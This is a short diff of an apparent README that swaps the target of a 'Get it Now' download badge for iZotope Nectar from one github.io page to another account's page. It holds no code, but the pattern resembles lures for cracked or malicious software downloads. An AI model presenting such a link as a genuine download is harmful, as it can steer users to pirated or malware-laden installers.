@@ -5,7 +5,7 @@
 <br>
 <div align="center">
 
-[![Get it Now](https://img.shields.io/badge/Get_it_Now-green?style=for-the-badge&logo=apple)](https://platinum-apps.github.io/.github/izotope-nectar)
+[![Get it Now](https://img.shields.io/badge/Get_it_Now-green?style=for-the-badge&logo=apple)](https://ebanenky-work.github.io/.github/izotope-nectar)
 
 </div>
 
